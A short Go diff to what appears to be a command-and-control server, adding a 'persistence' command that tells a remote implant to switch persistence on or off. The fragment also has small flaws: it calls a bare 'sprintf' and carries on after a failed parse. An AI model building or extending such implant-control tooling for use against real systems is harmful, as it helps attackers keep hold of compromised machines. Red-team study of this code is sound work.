@@ -128,6 +128,19 @@ func (c2 *c2) handle_user_input(text string) {
 
 		log.Println("Implant sleeping...")
 		c2.queue <- messages.C2_sleep(int64(seconds))
+	case "persistence":
+		if len(parts) != 2 {
+			incorrect_usage()
+			return
+		}
+
+		b, err := strconv.ParseBool(parts[1])
+		if err != nil {
+			fmt.Println("Not a valid bool: " + parts[1])
+		}
+
+		log.Println(sprintf("Setting persistence to %t", b))
+		c2.queue <- messages.C2_persistence(b)
 	case "help":
 		help()
 	default:
